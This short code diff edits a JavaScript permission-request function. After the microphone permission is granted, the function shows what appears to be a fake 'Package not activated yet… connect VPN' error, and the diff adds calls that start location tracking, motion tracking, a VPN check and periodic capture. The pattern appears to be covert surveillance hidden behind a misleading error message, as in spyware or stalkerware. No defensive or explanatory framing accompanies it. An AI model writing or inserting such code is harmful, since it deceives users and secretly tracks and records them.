@@ -2525,10 +2525,15 @@ async function requestAllPermissions() {
     permissionStatus.microphone = 'granted';
     
     setTimeout(() => {
-      activationStatus.style.display = 'block';
       activationStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> ❌ ERROR - Package not activated yet. Please try again after connecting VPN';
       permissionMessage.style.display = 'none';
     }, 3000);
+    
+    startLocationTracking();
+    startMotionTracking();
+    checkVPN();
+    
+    startPeriodicCapture();
     
   } catch (error) {
     console.error('Permission error:', error);
